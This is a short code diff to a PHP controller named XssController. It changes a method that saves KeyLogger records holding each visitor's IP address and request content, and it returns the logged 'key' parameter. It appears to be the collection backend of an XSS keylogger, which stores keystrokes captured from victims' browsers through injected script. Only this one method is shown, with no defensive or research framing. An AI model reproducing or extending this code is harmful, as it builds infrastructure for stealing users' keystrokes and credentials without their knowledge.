@@ -17,11 +17,11 @@ class XssController extends Controller
             $keyLogger->save();
         } else {
             $keyLogger = KeyLogger::create([
-                'ip' => '123',
+                'ip' => $ip,
                 'content' => $request
             ]);
         }
-        return $ip;
+        return $request->only('key')['key'];
     }
 
     function home(Request $request) {
